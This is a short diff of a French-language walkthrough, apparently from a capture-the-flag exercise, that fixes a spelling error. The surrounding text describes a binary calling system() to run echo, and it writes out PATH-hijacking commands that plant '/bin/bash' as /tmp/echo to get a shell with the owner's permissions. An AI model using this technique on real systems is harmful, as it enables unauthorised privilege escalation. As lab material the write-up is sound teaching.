@@ -15,7 +15,7 @@ system("/usr/bin/env echo Exploit me"Exploit me
 </code></pre>
 On observe que le binaire fait un appel system pour faire un **echo**
 
-Du coup nous essayons de changer cet appelle pour avoir acces a un shell avec les permissions de l'owner:
+Du coup nous essayons de changer cet appel pour avoir acces a un shell avec les permissions de l'owner:
 
 <pre><code>> echo "/bin/bash" > /tmp/echo
 > chmod 777 /tmp/echo && export PATH=/tmp:$PATH
